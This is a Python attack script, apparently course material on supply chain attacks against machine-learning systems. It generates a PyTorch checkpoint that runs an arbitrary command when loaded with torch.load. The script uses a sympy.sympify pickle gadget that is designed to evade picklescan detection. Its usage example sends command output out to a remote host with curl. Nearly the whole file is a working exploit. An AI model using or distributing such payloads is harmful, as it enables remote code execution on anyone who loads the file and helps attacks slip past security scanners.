#!/usr/bin/env python3
"""
Script: sympify_payload.py
Module: 08 — Supply Chain Attacks on AI/ML Systems
Purpose: Generate a pickled PyTorch checkpoint with a sympy gadget RCE payload
Usage: python3 sympify_payload.py <output.pt> <command>
Target: Any system calling torch.load(file, weights_only=False) or torch.load(file) on PyTorch < 2.6
"""

import sys
import torch
import sympy

def make_payload(cmd: str, out_path: str):
    """
    Craft a .pt file that executes cmd when loaded with torch.load(weights_only=False).
    The sympy.sympify() gadget passes the string to eval() internally, bypassing
    picklescan's GLOBAL opcode detection (sympy is in most whitelists).

    CRITICAL: Embed all objects (including padding) inside the dict.
    Never write bytes after torch.save() — that corrupts the zip archive.
    """
    class SympifyRCE:
        def __reduce__(self):
            # sympy.sympify evaluates arbitrary Python expressions
            return (sympy.sympify, (cmd,))

    payload = {
        "model_state_dict": {"weight": torch.zeros(1)},
        "optimizer_state_dict": {},
        "epoch": 1,
        # Padding inside dict (not appended) keeps zip valid
        "padding": "A" * (1024 * 1024 * 2),
        # The RCE object embedded as a dict value
        "extra": SympifyRCE(),
    }

    torch.save(payload, out_path)
    print(f"[+] Payload saved to {out_path}")
    print(f"[+] Command: {cmd}")
    print(f"[!] Executes on: torch.load('{out_path}', weights_only=False)")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <output.pt> <command>")
        print(f"  Example: {sys.argv[0]} evil.pt \"curl http://10.10.10.1/\$(id|base64)\"")
        sys.exit(1)
    make_payload(sys.argv[2], sys.argv[1])
